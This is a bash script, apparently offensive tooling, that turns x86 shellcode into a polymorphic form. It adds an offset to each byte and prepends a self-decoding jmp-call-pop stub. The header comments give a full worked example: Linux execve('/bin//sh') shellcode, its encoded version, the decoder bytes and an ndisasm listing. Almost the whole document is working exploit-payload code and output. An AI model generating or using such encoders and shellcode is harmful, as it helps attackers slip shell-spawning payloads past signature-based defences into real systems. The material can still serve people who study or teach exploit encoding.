#!/bin/bash

# Name:   shellcodepoly (polymorphic shellcode generator)
# Usage:  shellcodepoly  [offset]
# ./shellcodepoly.sh "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80" 
#input      = "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
#offset     = 0x1c
#obfuscated = "\x4d\xdc\xb5\xcc\x27\x6e\x84\x4b\x4b\x8f\x84\x84\x4b\x7e\x85\x8a\xa5\xff\x6e\xa5\xfe\x6f\xa5\xfd\xe9\x9c"
#length     = 0x1a
#decoder    = "\xeb\x10\x5e\x31\xc9\xb1\x1a\x80\x6c\x0e\xff\x1c\xfe\xc9\x75\xf7\xeb\x05\xe8\xeb\xff\xff\xff"
#
#output  = "\xeb\x10\x5e\x31\xc9\xb1\x1a\x80\x6c\x0e\xff\x1c\xfe\xc9\x75\xf7\
#xeb\x05\xe8\xeb\xff\xff\xff\x4d\xdc\xb5\
#xcc\x27\x6e\x84\x4b\x4b\x8f\x84\x84\x4b\x7e\x85\x8a\xa5\xff\x6e\xa5\xfe\x6f\xa5\xfd\xe9\x9c"
#
#00000000  EB10              jmp short 0x12
#00000002  5E                pop esi
#00000003  31C9              xor ecx,ecx
#00000005  B11A              mov cl,0x1a
#00000007  806C0EFF1C        sub byte [esi+ecx-0x1],0x1c
#0000000C  FEC9              dec cl
#0000000E  75F7              jnz 0x7
#00000010  EB05              jmp short 0x17
#00000012  E8EBFFFFFF        call dword 0x2
#00000017  4D                dec ebp
#00000018  DCB5CC276E84      fdiv qword [ebp-0x7b91d834]
#0000001E  4B                dec ebx
#0000001F  4B                dec ebx
#00000020  8F84844B7E858A    pop dword [esp+eax*4-0x757a81b5]
#00000027  A5                movsd
#00000028  FF6EA5            jmp dword far [esi-0x5b]
#0000002B  FE                db 0xfe
#0000002C  6F                outsd
#0000002D  A5                movsd
#0000002E  FD                std
#0000002F  E9                db 0xe9
#00000030  9C                pushfd
#shellcode="$1"
#offset="$2"

bytes=`echo $shellcode | tr -d \" | sed 's/\\\x/\n/g' | grep -v ^$`
max=`echo "$bytes" | sort -ru | head -n1`
length=0
decoder="\xeb\x10\x5e\x31\xc9\xb1\x00\x80\x6c\x0e\xff\x00\xfe\xc9\x75\xf7\xeb\x05\xe8\xeb\xff\xff\xff"

if [ "$offset" == "" ]; then offset=`bconv FF-$max x x`; fi

echo ""
echo "input      = \"$shellcode\""
echo "offset     = 0x$offset"

for byte in `echo "$bytes"`; do
        length=`bconv $length+1 x x`
        obfuscated=$(echo -n "$obfuscated\x`bconv $byte+$offset x x`")
done

echo "obfuscated = \"$obfuscated\""
echo "length     = 0x$length"

decoder=`echo $decoder | sed -e "s/00/$length/" -e "s/00/$offset/"`

echo "decoder    = \"$decoder\""
echo ""

output="$decoder$obfuscated"

echo "output  = \"$output\""
echo ""
echo -ne $output | ndisasm -u -
